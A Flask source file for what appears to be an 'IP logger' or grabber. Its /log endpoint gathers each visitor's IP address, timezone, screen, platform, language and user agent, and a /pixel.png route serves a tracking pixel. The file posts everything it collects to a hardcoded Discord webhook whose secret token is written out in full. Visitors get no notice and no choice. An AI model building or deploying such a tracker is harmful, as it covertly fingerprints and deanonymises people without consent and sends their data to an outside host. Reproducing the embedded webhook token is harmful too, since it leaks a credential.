from flask import Flask, request, jsonify, render_template, send_file
from datetime import datetime
import requests
import os

app = Flask(__name__)

# Your Discord webhook URL (replace this with your real webhook)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1414641676219191477/COlrJnlgxYeQhzLY2KXsHrDGzE_UYH0Q1kI19zcOCh7kEfSkNa-6QVGSAqir8MdTLNEj"

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/log", methods=["POST"])
def log():
    data = request.get_json()
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    message = (
        f"||@everyone||\n"
        f"📥 **New Log!**\n"
        f"Time: {timestamp}\n"
        f"IP: `{ip}`\n"
        f"Timezone: `{data.get('timezone')}`\n"
        f"Screen: `{data.get('screen')}`\n"
        f"Platform: `{data.get('platform')}`\n"
        f"Language: `{data.get('language')}`\n"
        f"Touch: `{data.get('touch')}`\n"
        f"User-Agent:\n```\n{data.get('userAgent')}\n```"
    )

    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json={"content": message})
        response.raise_for_status()
    except Exception as e:
        print("Error sending to Discord:", e)

    return jsonify({"status": "logged"})

@app.route("/pixel.png")
def pixel():
    if os.path.isfile("pixel.png"):
        return send_file("pixel.png", mimetype="image/png")
    else:
        return "Pixel not found", 404

if __name__ == "__main__":
    app.run(debug=True)
